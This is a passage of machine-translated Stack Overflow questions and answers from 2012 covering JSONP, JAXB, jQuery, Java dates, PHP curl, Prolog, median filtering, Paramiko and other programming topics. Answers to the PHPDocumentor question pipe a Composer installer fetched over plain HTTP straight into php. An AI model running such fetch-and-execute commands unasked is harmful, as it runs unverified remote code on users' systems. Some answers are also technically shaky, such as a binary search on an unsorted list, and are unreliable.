         "dateTime", "10/10/1970"
         "id": "1",
         "message": "yyyy"
     }
     {
         "lookup": "dsdfasfsadf"
         "dateTime", "15/05/2012"
         "id": "2",
         "message": "dsdfasfsadf"
     }
 ]
 } 
```

有谁知道为什么会出错，因为 JSON 格式有效。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-05T14:48:19.410

由于您将其请求为**jsonp**，而不仅仅是**json**，因此它希望您的 json 包含在回调函数中。就像是：

```
callback({
 "rows": [
     {
         "lookup": "yyyy"
         "dateTime", "10/10/1970"
         "id": "1",
         "message": "yyyy"
     }
     {
         "lookup": "dsdfasfsadf"
         "dateTime", "15/05/2012"
         "id": "2",
         "message": "dsdfasfsadf"
     }
 ]
 }) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T00:57:04.707

我的猜测是您正在访问的服务返回 JSON 而**不是**JSONP。在 jsonp 标记中搜索“意外令牌”。您会发现例如[为什么这个 JSONP 提要会抛出“Unexpected Token”错误？](https://stackoverflow.com/q/10093697/1211981)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T18:06:00.043

您在中间缺少一个逗号：

```
{
 "rows": [
     {
         "lookup": "yyyy"
         "dateTime", "10/10/1970"
         "id": "1",
         "message": "yyyy"
     },
     {
         "lookup": "dsdfasfsadf"
         "dateTime", "15/05/2012"
         "id": "2",
         "message": "dsdfasfsadf"
     }
 ]
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T02:39:30.323

`':'`首先，你在很多地方都不见了，`','`在陈述的结尾也不见了。`:`在属性值之前和`,`语句结束时使用总是好的做法。

像这样，

```
 ...  
 ...  
 requires: [
     'Projeto.model.Mural'
 ],

 config: {
     autoLoad: true,
     model: 'Projeto.model.Mural',
     storeId: 'MuralStore',
     proxy : {
        type:'jsonp',
     },
 ....
 .... 
```

其次，发生此错误是因为您的响应**不是 VALID** jsonp 响应。

当我检查[jsonplint.com](http://jsonplint.com)时，它向我显示了这个错误

```
Invalid JSONP
No callback function defined
Improper or no closing 
```

1.  所以，要么你需要确保你定义了一个*有效的回调函数。*

2.  否则，你可以做一件事。更改`type:'jsonp'`to`type:'ajax'`应该可以解决您的问题，而无需更改其他任何内容。

# enums - JAXB 将字符串映射到生成的 XSD 中的枚举值

> ID：10338865
> 
> 赞同：1
> 
> 时间：2012-04-26T17:59:49.517
> 
> 标签：enums, jaxb

我有一个带有 String 属性的简单 POJO。此 String 属性实际上包含由 Java Enum 支持的值。由于我不会在这里讨论的原因，我不能只在我的 POJO 上使用枚举类型。是否可以在 String 属性上使用任何 JAXB 注释，以便在生成 XSD 时，我将值限制为 Enum 值的后备列表？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:57:14.243

您应该能够将 an`XmlAdapter`用于此用例：

```
public class MyEnumAdapter extends XmlAdapter<MyEnum, String> {
   ...
} 
```

然后在你的类上注册对应于枚举`XmlAdapter`的`String`属性。

```
@XmlJavaTypeAdapter(MyEnumAdapter.class)
public String getValue() {
    return value;
} 
```

# jquery - 使用 jquery Watermark，我如何分配它做一个尚未创建的 div？

> ID：10338868
> 
> 赞同：0
> 
> 时间：2012-04-26T18:00:04.867
> 
> 标签：jquery, watermark

在这个示例中，水印插件最初不起作用，因为 div "tbFirstName" 尚未加载。

```
$(document).ready(function () {
         $('#tbFirstName').watermark('Required information');
}); 
```

(.live) Jquery 工具或 (.on) 工具似乎基于诸如“单击”或“模糊”之类的事件工作。您知道如何在将来加载的 div 上获得这种水印效果，而不必分配给用户事件吗？

非常感谢！

参考： [http ://code.google.com/p/jquery-watermark/](http://code.google.com/p/jquery-watermark/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T18:04:05.380

你可以试试这个`DOMNodeInserted`事件：

```
$(document).on('DOMNodeInserted','#tbFirstName',function(){
    $('#tbFirstName').watermark('Required information');
}); 
```

[JS Fiddle 概念验证](http://jsfiddle.net/davidThomas/BkgBe/)。

请注意，将`on()`方法附加到最接近要附加`$('#tbFirstName')`元素的父元素的任何元素上很重要，否则每次将某些内容附加到 DOM 时它都会运行。

还值得注意的是，为了完成，将*创建*或*附加*该元素的`watermark()`同时绑定到 DOM 会更容易、更有效。

 **参考：

*   [`DOMNodeInserted`在 W3.org](http://www.w3.org/TR/DOM-Level-2-Events/events.html)。
*   [`DOMNodeInserted`在 MDN 上](https://developer.mozilla.org/en/DOM/DOM_event_reference)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T18:23:11.767

您可以随时调用`.watermark()`新的输入创建

像[JsBin 中的这个例子](http://jsbin.com/ocevat/edit#javascript,html)

```
$(function() {

  $(".watermark").watermark("Write something...");

  $(".btn-add").click(function() {
    $(".list").append('<li><input type="text" class="watermark" /></li>');
    $(".watermark").watermark("Write something...");
  });

}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T18:04:06.537

尝试将您的代码更改为：

```
$(document).ready(function () {
         $('#tbFirstName').live("watermark", function(){ 
            $('#tbFirstName').html("required info");
        });
}); 
```

原因，由于元素不存在，绑定不起作用。“live” api 用于将事件动态绑定到元素。

参考：[http ://api.jquery.com/live/](http://api.jquery.com/live/)

编辑：斯蒂芬指出“live（）”不起作用，我只是在您的描述中读到相同的内容，抱歉:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-26T21:53:04.763

我发现我的问题是特定于 ASP.NET 更新面板的。一个帖子让我找到了正确的答案，那就是使用它：

```
function pageLoad(sender, args) { 
    ... 
} 
```

而不是 $(document).ready 函数。

感谢所有提供帮助的人——非常感谢。这是有用的帖子：

[如何在更新面板回发后执行 javascript 回调...](https://stackoverflow.com/questions/1152946/how-to-have-a-javascript-callback-executed-after-an-update-panel-postback)**

# java - Java 日期和时间格式

> ID：10338874
> 
> 赞同：2
> 
> 时间：2012-04-26T18:00:16.083
> 
> 标签：java, date, time, date-format

我正在尝试格式化时间，以便用户可以输入时间。

```
 b1.setStartTime(JOptionPane.showInputDialog("Enter Start time for Booking: ")); 
```

有没有办法为上面的代码做到这一点？

我尝试将预订类中的 startTime 更改为时间戳，并且主要尝试使用此代码：

```
DateFormat timeFormatter =
    DateFormat.getTimeInstance(DateFormat.SHORT, b1.getStartTime()); 
```

但我很难把头绕过去。我想要做的就是允许用户输入时间作为简短版本，例如上午 7:20。然后我可以利用这段时间与 SQL 数据库进行比较。

对我来说， DateFormat.getTimeInstance() 似乎是要走的路。如果我要使用它，预订类中的 startTime 应该是 Date 类型，我将如何格式化用户输入？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:03:39.127

```
String datetime = [code to get time string];
SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss a");
Date date = (Date) sdf.parse(datetime); 
```

以后，您可以参考 SimpleDateFormat 的 java 文档来了解如何设置格式： [http ://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html](http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T18:10:23.513

SimpleDateFormat 可能对您很方便：

```
 tf = new java.text.SimpleDateFormat ("h:mm a") 
```

您可以使用它来解析时间：

```
 Date d = tf.parse (textfield.getText ()); 
```

反之，以这种格式输出日期/时间：

```
 System.out.println ("Time: " + tf.fomat (date)); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T18:04:32.023

首先，您应该始终检查 JOptionPane 的结果，以确保用户确实输入了某些内容并且没有单击取消。

其次，如果你知道你希望你的用户如何输入时间，你需要（a）告诉他们如何输入它（b）使用 SimpleDateFormat 来解析它

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-08-09T00:30:53.537

其他答案是正确的，但已过时。

# java.time

java.time框架内置于 Java 8 及更高版本中[。](http://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html)这些类取代了旧的麻烦的日期时间类，例如`java.util.Date`, `.Calendar`, & `java.text.SimpleDateFormat`。[Joda-Time](http://www.joda.org/joda-time/)团队还建议迁移到 java.time 。

要了解更多信息，请参阅[Oracle 教程](http://docs.oracle.com/javase/tutorial/datetime/TOC.html)。并在 Stack Overflow 上搜索许多示例和解释。

许多 java.time 功能在 ThreeTen-Backport 中向后移植到 Java 6 和 7，并在[ThreeTenABP](https://github.com/JakeWharton/ThreeTenABP)[中](http://www.threeten.org/threetenbp/)进一步适应 Android 。

# `LocalTime`

该类`LocalTime`表示没有日期和时区的一天中的时间。

定义格式模式。此处看到的模式适用于 12 小时制，预计小时值为 1-12。

```
DateTimeFormatter f = DateTimeFormatter.ofPattern( "h:m a" ); 
```

使用该格式化程序进行解析。

```
String input = "7:20 AM";
LocalTime localTime = LocalTime.parse( input , f ); 
```

当然，您还应该清理您的数据输入并添加代码以捕获由于无效输入而引发的任何异常。为简洁起见，此处省略了此类代码。

# 数据库

要查询数据库，如果您的 JDBC 驱动程序符合[JDBC 4.2](https://www.jcp.org/en/jsr/detail?id=221)或更高版本，您可以直接通过/使用该`LocalTime`对象。`setObject``getObject`

如果不是，请使用添加到旧类的新方法转换为旧 java.sql 类型。在这种情况下，[`java.sql.Time`](http://docs.oracle.com/javase/8/docs/api/java/sql/Time.html)。

```
java.sql.Time t = java.sql.Time.valueOf( localTime ); 
```

……还有另一个方向……</p>

```
LocalTime localTime = t.toLocalTime(); 
```

# php - 如何使用 CURL 而不是 file_get_contents 重写此 RSS 阅读器？

> ID：10338877
> 
> 赞同：2
> 
> 时间：2012-04-26T18:00:49.843
> 
> 标签：php, curl, rss

诚然，我是个新手，只知道危险。

出于安全考虑，主机服务器不允许使用 file_get_contents。如何使用 curl 而不是 file_get_contents 重写下面的代码？

这适用于 jquery 移动网站上的 rss 阅读器。该代码基于我在这里找到的教程：[nets.tutplus.com/rssreader](http://net.tutsplus.com/tutorials/javascript-ajax/how-to-build-an-rss-reader-with-jquery-mobile-2/comment-page-2/#comments)

```
<?php
$siteName = empty($_GET['siteName']) ? 'Website' : $_GET['siteName'];
$siteList = array(
'Website2',
'Website3',
'Website4',
'Website5',
'Website6',
);
// For security.
if ( !in_array($siteName, $siteList) ) {
$siteName = 'Website';
}
$location = "http://query.yahooapis.com/v1/public/yql?q=";
$location .= urlencode("SELECT * FROM feed where url='http://feeds.feedburner.com/$siteName'");
$location .= "&format=json";
$rss = file_get_contents($location, true);
$rss = json_decode($rss);
?> 
```

编辑：这行得通吗？

```
$location = "http://query.yahooapis.com/v1/public/yql?q=";
$location .= urlencode("SELECT * FROM feed where url='http://feeds.feedburner.com/$siteName'");
$location .= "&format=json";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $location);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true );
curl_setopt($ch, CURLOPT_POST, true );
curl_setopt($ch, CURLOPT_POSTFIELDS, trim($request)); 
$rss = curl_exec($ch);
curl_close($ch); 

$rss = json_decode($rss); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:34:47.760

您可以完全删除这些`CURLOPT_POST...`线条。 `$request`未设置，并且您不需要在这种情况下发出 GET 请求的发布请求。您可能需要也可能不需要使用`CURLOPT_FOLLOWLOCATION`-- 如果 curl 尚未按需要工作，请打开它。

# java - 有限域求解器 fd_minimize/2

> ID：10338879
> 
> 赞同：3
> 
> 时间：2012-04-26T18:01:02.027
> 
> 标签：java, prolog, clpfd, gnu-prolog

我需要最小化 Prolog 中的谓词。目前我正在使用 GNU Prolog Java。我有这个事实

```
army( Territory,X ). 
```

它说给定的领土有X军队。现在我想找到给定玩家拥有的最小军队数量。所以我在写：

```
place_army( Player, Territory ):-
    fd_maximize( army(Territory, X), X ),
    owner( Player, Territory ). 
```

口译员说：

> java.lang.IllegalArgumentException：目标当前未激活

过了一会儿，我发现了问题：[http](http://www.gprolog.org/manual/gprolog.html#htoc313) ://www.gprolog.org/manual/gprolog.html#htoc313 我认为问题是解释器的 Java 实现没有 FD 求解器。任何提示/解决方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T19:04:10.797

有两个不同的系统具有非常相似的名称：

GNU Prolog（参见[gnu-prolog](/questions/tagged/gnu-prolog "显示标记为“gnu-prolog”的问题")），一个 ISO Prolog 系统，具有开创性的 CLP(FD) 实现，在 1999 年 4 月 19 日采用了这个名称[，](https://groups.google.com/group/comp.lang.prolog/browse_thread/thread/34efd5ac8304aeb2/f7b92b6f6bd7d94c)并且正在[积极开发](http://gprolog.univ-paris1.fr/unstable/?C=M;O=D)——最新版本在一小时前发布。`fd_minimize/2`这些都是 GNU Prolog 的一部分。

还有一个最近的系统，叫做[GNU Prolog for Java——](http://www.gnu.org/software/gnuprologjava/)它的最新版本是[2010-08-15](http://alpha.gnu.org/gnu/gnuprologjava/)。

也许这种命名混乱可以解决。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T18:18:45.117

您可以获得与`fd_minimize/2`提供`findall/3`和`keysort/2`谓词相同的结果。

```
 findall(X-T,army(T,X),B),keysort(B,[MinX-Territory|Cs]), 
```

可以代替

```
 fd_minimize(army(Territory,X),X), 
```

为 提供相同的值`Territory`。

# c++ - 用于“UINT16”二维数组的 C/C++ 中的快速中值滤波器

> ID：10338888
> 
> 赞同：6
> 
> 时间：2012-04-26T18:01:53.650
> 
> 标签：c++, c, image-processing, code-snippets, median

有谁知道 C++ 中 16 位（无符号短）数组的快速中值滤波算法？

[http://nomis80.org/ctmf.html](http://nomis80.org/ctmf.html)

这似乎很有希望，但它似乎只适用于字节数组。有谁知道如何修改它以使用短裤或替代算法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T18:24:18.553

本文中的技术依赖于为 8 位像素通道创建具有 256 个 bin 的直方图。转换为每通道 16 位需要一个具有 65536 个 bin 的直方图，并且图像的每一列都需要一个直方图。将内存需求增加 256 会使这个算法总体上效率较低，但对于今天的硬件来说仍然可能是可行的。

使用他们提出的将直方图分解为粗略和精细部分的优化应该进一步将运行时命中率降低到仅 16 倍。

对于小半径值，我认为您会发现传统的中值滤波方法会更高效。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-26T18:05:30.623

[Fast Median Search - An ANSI C implementation](http://ndevilla.free.fr/median/median.pdf) (PDF) 是 C 的东西，它是一篇标题为“Fast median search: an ANSI C implementation”的论文。作者声称它是 O(log(n))，他还提供了一些代码，也许它会对你有所帮助。它并不比您建议的代码好，但也许值得一看。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2021-01-06T16:14:32.610

```
std::vector<unsigned short> v{4, 2, 5, 1, 3};
std::vector<unsigned short> h(v.size()/2+1);
std::partial_sort_copy(v.begin(), v.end(), h.begin(), h.end());
int median = h.back(); 
```

在 O(N·log(N/2+1)) 中运行并且不会修改您的输入。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-03-02T15:11:38.743

本文描述了一种对图像进行中值滤波的方法，该方法在每个像素的 O(log *r ) 时间内运行，其中**r*是滤波器半径，适用于任何数据类型（无论是 8 位整数还是双精度数）：

[快速中值和双边滤波](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.93.1608&rep=rep1&type=pdf)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-05-22T22:47:46.513

参见下一篇论文中的等式 4 和 5。复杂度为 O(N*W)，其中 W 是滤波器的宽度，N 是样本数。

请参阅[矢量中值滤波降噪](http://www.cas.cn/ky/kyjz/201305/W020130504687068232825.pdf)。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-02-13T03:42:13.997

我知道这个问题有点老了，但我也对中值过滤感兴趣。如果一个人正在处理信号或图像，那么处理窗口中的数据会有很大的重叠。可以利用这一点。

我在这里发布了一些基准代码：[C++ 中的一维移动中值过滤](https://github.com/weegreenblobbie/median_filter_benchmark)

它是基于模板的，因此它应该适用于大多数 POD 数据类型。

根据我的结果`std::nth_element`，移动中位数的性能很差，因为它每次都必须对值窗口进行排序。

但是，使用一个保持排序的值池，可以使用 3 操作执行中值。

1.  从池中删除最旧的值（调用 std::lower_bound）
2.  将新值插入池中（调用 std::lower_bound）
3.  在历史缓冲区中存储新值

中位数现在是池中的中间值。

我希望有人觉得这很有趣并贡献他们的想法！

# php - Jquery 计数器 - 在定期增加的两个变量值之间进行计数

> ID：10338892
> 
> 赞同：1
> 
> 时间：2012-04-26T18:02:06.130
> 
> 标签：php, jquery, counter

我有一个奇怪的客户端请求，似乎不适合任何现成的 jQuery 插件，我正在努力找出如何最好地实现。

基本上，它是一个代表预计已节省的二氧化碳排放量的计数器。这个想法是计数器将根据前几个月的数据运行。

因此，在每个月初，网络管理员将设置开始/结束值。

然后在一个月内，页面需要在起始点加载（在 PHP 中根据日期与起始点计算），然后每 5 秒从那里增加一次。

所以在一个例子中：

```
startValue = 200000;
endValue = 225000;
updateInterval = 5; /* seconds */ 
```

在那段时间里，我们有 25,000 个单位要计算。这 25,000 应该除以一个月中 5 秒的增量数，并且计数器需要每 5 秒增加一次。

我想我终于理解了这个理论（我的客户以最复杂的解释发送了它！）但我正在努力解决如何解决它。

我认为这很简单......但希望能得到一些指导让我上路！

谢谢，史蒂夫

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:12:06.250

您好，您可以使用 javascript setInterval 方法

```
setInterval(callYouFunction(), time interval in miliseconds) 
```

然后增加你的变量

希望这可以帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T18:26:26.557

也许可以开始：

**html:**

```
<div id="start">20</div>
<div id="end"></div>
<div id="interval">5</div> 
```

**js：**

```
var start    = 21;
var end      = 25;
var interval = 5000;    

var refreshIntervalId = setInterval(function(){
   if(start <= end){
      $("#start").text(start++);
   }else{
      stop();   
   }
},interval);

function stop(){
   clearInterval(refreshIntervalId);    
}​ 
```

[**演示**](http://jsfiddle.net/vax5W/16/)

# documentation - 在 Mac 上手动安装 PHPDocumentor

> ID：10338893
> 
> 赞同：5
> 
> 时间：2012-04-26T18:02:07.333
> 
> 标签：documentation, documentation-generation, phpdoc, code-documentation

在尝试使用 PEAR install 安装 PHPDocumentor 没有成功后，我按照官方网站上的详细说明手动尝试了：[http ://www.phpdoc.org/docs/latest/for-users/installation.html](http://www.phpdoc.org/docs/latest/for-users/installation.html)

我下载了文件并在 /usr/bin/ 上创建了一个别名，但是当我尝试通过终端 y 执行 phpdoc.php 时，它显示错误。

这是我尝试的：

```
> cd /usr/bin/
> ./phpdoc.php 
```

这是错误：

```
PHP Warning:  include_once(/Applications/MAMP/htdocs/phpdocumentor/src/phpDocumentor/../../vendor/autoload.php): failed to open stream: No such file or directory in /Applications/MAMP/htdocs/phpdocumentor/src/phpDocumentor/Bootstrap.php on line 72
PHP Warning:  include_once(): Failed opening '/Applications/MAMP/htdocs/phpdocumentor/src/phpDocumentor/../../vendor/autoload.php' for inclusion (include_path='/Applications/MAMP/bin/php/php5.3.6/lib/php/:/Applications/MAMP/bin/php/php5.3.6/lib/bin/') in /Applications/MAMP/htdocs/phpdocumentor/src/phpDocumentor/Bootstrap.php on line 72
PHP Fatal error:  Class 'phpDocumentor_Task_Runner' not found in /Applications/MAMP/htdocs/phpdocumentor/bin/phpdoc.php on line 37 
```

我正在使用 Mac Os X，如您所见，我使用 MAMP 来运行 Apache。这里发生了什么？为什么它试图打开一个不存在的文件？（因为它确实不存在于 PHPDocumentor 文件夹中）

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T17:19:24.747

你试过了吗 ：

```
curl -s http://getcomposer.org/installer | php

php composer install 
```

在 phpdocumentor2 目录上（你应该找到 composer.json）

[Composer](http://getcomposer.org/)是 php 的依赖管理器。因此它将使用外部/供应商依赖项填充 phpdocumentor projet

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-19T07:58:21.743

试试这个把 Composer 安装到你的 MAMP php bin 中：

```
cd yourapp/ && curl -s http://getcomposer.org/installer | /Applications/MAMP/bin/php/php5.3.6/bin/php 
```

# java - Java 数组列表搜索

> ID：10338894
> 
> 赞同：0
> 
> 时间：2012-04-26T18:02:08.830
> 
> 标签：java, arraylist

我有一个`ArrayList`类型`String`。我想确定此元素是否`ArrayList`以指定的字符串开头，如果`ArrayList`包含此元素，那么我想获取此元素的索引。另外，我不想循环这个`ArrayList`来获取那个元素的索引。

例如 ：

```
ArrayList<String> asd = new ArrayList<String>();  // We have an array list

//We filled the array list
asd.add("abcc trtiou");
asd.add("aiwr hiut qwe");
asd.add("vkl: gtr");
asd.add("aAgiur gfjhg ewru"); 
```

现在，我想`vkl: gtr`通过使用`vkl:`不循环数组列表来获取元素的索引。（搜索也应该不区分大小写，所以，使用`vkl:`和`VkL:`应该给出的索引`vkl: gtr`）

我怎样才能做到这一点 ？

提前致谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-26T18:04:34.540

您必须循环 ArrayList。您不可能只访问一个索引并保证它就是您要查找的内容。

此外，如果涉及大量搜索，您应该考虑使用其他数据结构。搜索 ArrayList 需要`O(n)`时间，而在`O(log n)`.

如果您在程序执行之前知道用于定位结构中项目的字符串，请考虑使用 HashMap。您可以访问 中的项目`O(1)`。

如果这些解决方案都不适合您的特定问题，请根据您正在尝试做的事情扩展您的答案，我们可以提供更好的答案，说明您如何在最短的搜索时间内找到您的项目。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T18:11:48.660

如果您不希望执行循环并搜索 arraylist 中保存的字符串对象，这是*您可以满足的要求。*

```
if(asd.contains("vkl: gtr"))
{
  int index=asd.indexOf("vkl: gtr");
} 
```

或者简单地说：

```
int index = Arrays.binarySearch(asd.toArray(), 0, asd.size()-1, "vkl: gtr"); 
```

如果在您的调用方法中执行循环是您想要避免的，那么您可以创建一个扩展的类`ArrayList`并拥有一个执行索引查找的方法。

```
 class MyArray extends ArrayList<String>
  {
    public int getIndexOf(String o)
    {
      for (int i = 0; i < size(); i++)
      {
        if (get(i).contains((String) o)) return i;
      }
      return -(size() - 1);
    }
  } 
```

然后从您的调用程序执行：

```
public void foo()
{
    MyArray asd = new MyArray();
    asd.add("abcc trtiou");
    asd.add("aiwr hiut qwe");
    asd.add("vkl: gtr");
    asd.add("aAgiur gfjhg ewru");

    int index = asd.getIndexOf("vkl:");
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T18:12:16.860

```
for(int i=0; i < asd.size(); i++) {
    String s = asd.get(i);
    //search the string
    if(found) {
        return i
    }
}
return -1 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-26T18:11:52.490

我真的不明白您是否正在寻找诸如键值对或单字符串条目搜索之类的东西。如果你正在寻找第一个，你应该使用 Map 而不是一个简单的数组，如果你想搜索一个键在这里你可以使用一对

```
put(Object key, Object value) 
```

并获取指定键的值

```
get(Object key) 
```

如果您只是为了快速将字符串的一部分查找到数组中，则必须读取所有索引并使用 stringToCompare.equalsIgnoreCase(otherStringToCompare) 逐个比较字符串。请注意，如果 stringToCompare 为 NULL，这将引发异常

# ruby - Rails 找不到 CSV 固定装置

> ID：10338903
> 
> 赞同：1
> 
> 时间：2012-04-26T18:02:59.327
> 
> 标签：ruby, ruby-on-rails-3, activerecord, fixtures

我正在尝试使用 CSV 固定装置，但是当我这样做时`rake db:fixtures:load`，它会抱怨`test/fixtures`. 当装置在 YAML 中并且文件以`.yml`.

此外，当我查看 中的代码时`activerecord-3.2.3/lib/active_record/fixtures.rb`，我完全没有看到对 CSV 处理的引用。似乎`fixtures.rb`只知道如何使用 YAML 固定装置。

这里有什么？CSV 固定装置是否已被弃用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:16:52.707

CSV Fixtures 已被弃用，Rails 3.2.0 中将删除支持

[http://guides.rubyonrails.org/3_1_release_notes.html](http://guides.rubyonrails.org/3_1_release_notes.html)

[https://github.com/rails/rails/commit/1716da07204193c8acf967e2d75a53a82e4c7c28#a​​ctiverecord/lib/active_record/fixtures.rb](https://github.com/rails/rails/commit/1716da07204193c8acf967e2d75a53a82e4c7c28#activerecord/lib/active_record/fixtures.rb)

# python - 带有 paramiko 的 SCP，使用不同的远程和本地目录

> ID：10338911
> 
> 赞同：4
> 
> 时间：2012-04-26T18:03:20.450
> 
> 标签：python, linux, paramiko

我有一个使用 Paramiko 的 Python 代码。

```
#!/usr/bin/env python

import paramiko

username = ('user')
password = ('1234')
hostname = ('test-server.com')
ports = 22
localD = ('/var/tmp/testxxxxxxxx.tar.gz')
remoteD = ('/var/tmp/testxxxxxxxx.tar.gz')

paramiko.util.log_to_file('/tmp/paramiko.log')
transport = paramiko.Transport((hostname, ports))
transport.connect(username = username, password = password)
sftp = paramiko.SFTPClient.from_transport(transport)
sftp.put(remotepath=remoteD, localpath=localD)

sftp.close()
transport.close() 
```

使用此代码，本地目录和远程目录应该相等。如果不是“找不到文件”如何更改或使用与本地目录不同的另一个远程目录？例子：

```
localD = ('/var/tmp/testxxxxxxxx.tar.gz')
remoteD = ('/home/user/testxxxxxxxx.tar.gz') 
```

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T18:33:03.823

由于错误消息显示“没有这样的文件**或目录**”，我首先检查以确保该目录存在于远程系统上并且可以由您使用的凭据写入。SFTPClient 类具有各种其他方法，您可以调用这些方法来验证目标路径是否存在，如果它们尚不存在则创建它们。

例如，调用传入目标路径的 stat() 方法应该会返回一个与 os.stat 返回的元组相同的元组。尝试运行这个脚本（我刚刚破解了一个小路径检查例程并将其放入您的脚本中）：

```
#!/usr/bin/env python

import paramiko

username = ('user')
password = ('1234')
hostname = ('test-server.com')
ports = 22
localD = ('/var/tmp/testxxxxxxxx.tar.gz')
remoteD = ('/var/tmp/testxxxxxxxx.tar.gz')

def check(sftp, path):
    parts = path.split('/')
    for n in range(2, len(parts) + 1):
        path = '/'.join(parts[:n])
        print 'Path:', path,
        sys.stdout.flush()
        try:
            s = sftp.stat(path)
            print 'mode =', oct(s.st_mode)
        except IOError as e:
            print e

paramiko.util.log_to_file('/tmp/paramiko.log')
transport = paramiko.Transport((hostname, ports))
transport.connect(username = username, password = password)
sftp = paramiko.SFTPClient.from_transport(transport)
check(sftp, remoteD)

sftp.close()
transport.close() 
```

输出应该是这样的：

```
Path: /var mode = 040755
Path: /var/tmp mode = 040700
Path: /var/tmp/testxxxxxxxx.tar.gz [Errno 2] No such file 
```

模式编号很可能会有所不同，但除了文件名之外，路径的任何部分都不应该出现“没有这样的文件”错误。如果这样做，则可能意味着您需要使用 sftp.mkdir() 将路径构建到要放置文件的位置

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-12T10:52:17.617

这是 sftp，不是 SCP。当连接到有 dropbear 的设备时（例如 OpenWRT 上的设备）*没有*sftp 子系统，所以 sftp 失败。相反，我使用 tar 命令（paramiko 在“连接”函数后面抽象出来。

然而，我在 paramiko 上寻找*实际*的SCP，不幸的是，这里的答案位于谷歌搜索的顶部，*实际上*并没有回答这个问题。

```
# argh argh argh dropbear on openwrt not compiled with sftp
# have to use some horribleness...

tw = connect(ipaddr, "root", server_root_password, command="tar xvf -",
             debug_level=debug_level)

tf = StringIO()
tar = tarfile.open(mode= "w:", fileobj = tf)
taradd(tar, "etc/tinc/....")
taradd(tar, ".....", ...)
taradd(tar, "....", ...)
taradd(tar, "etc/init.d/tinc", ...., ex=True)
tar.close()

tf.seek(0)
txt = tf.read()
tw.t.write(txt)
tw.t.write('^D')
tw.t.w.close()
tw.t.w = None
tw.close() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-12-12T10:58:07.827

[https://github.com/jbardin/scp.py](https://github.com/jbardin/scp.py)

上面的代码并没有真正回答所提出的问题，而是提供了与 openssh SCP 协议兼容的 scp 的实际实现。就我个人而言，我还没有使用 dropbear 对其进行测试，但它是实际回答主题行中问题的代码。

SCP！= SFTP。

# python - 在 Python 中为战舰游戏创建和保存文本文件

> ID：10338914
> 
> 赞同：2
> 
> 时间：2012-04-26T18:03:26.627
> 
> 标签：python

我已经在同一个战舰游戏上工作了很长一段时间，现在已经到了最后阶段。现在我需要让游戏使用函数将前五名的分数保存在一个文本文件中`def saveScore`。然后我需要它来读取我刚刚创建的文件并将分数加载到 Python 代码中，并使用`try`和`except`来打开和关闭文件。我不知道如何让 Python 识别我的变量`score`，因为我相信它只是本地的。这就是我所拥有的。我不知道如何使用泡菜。

```
def main():
    board=createBoard()
    printBoard(board)
    s = [[21,22,23,24,25],
    [45,55,65,75],
    [1,2,3],
    [85,86,87],
    [5,15],
    [46,56]]
    playBattleship(s,board)
main() 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:14:11.163

使用 pickle 是将 python 对象序列化到文件中的一种较低级别的方法，然后将格式再次读回对象中。如果您想要一些更高级的界面，可能更容易自然使用，请尝试查看`shelve`模块：[http ://docs.python.org/library/shelve.html#example](http://docs.python.org/library/shelve.html#example)

您可以将其视为字典，只需附加并保存您的分数。它将通过在引擎盖下酸洗保存到文件中。

```
import shelve

# open a shelve file. writeback=True makes it save
# on the fly
d = shelve.open('temp.file', writeback=True)
if not d.has_key('scores'):
    d['scores'] = []

print d['scores']
# []

# add some score values
d['scores'].append(10)
d['scores'].append(20)
d.close()

# next time, open the file again. It will have
# the 'scores' key. Though you should probably check
# for it each time in case its a first run.
d = shelve.open('temp.file', writeback=True)
print d['scores']
#[10, 20]

# sort the list backwards and take the first 5 top scores
topScores = sorted(d['scores'], reverse=True)[:5] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T18:09:41.670

可能最简单的方法是使用 Pickle。使用“加载”和“转储”功能，您可以轻松保存/加载乐谱对象。

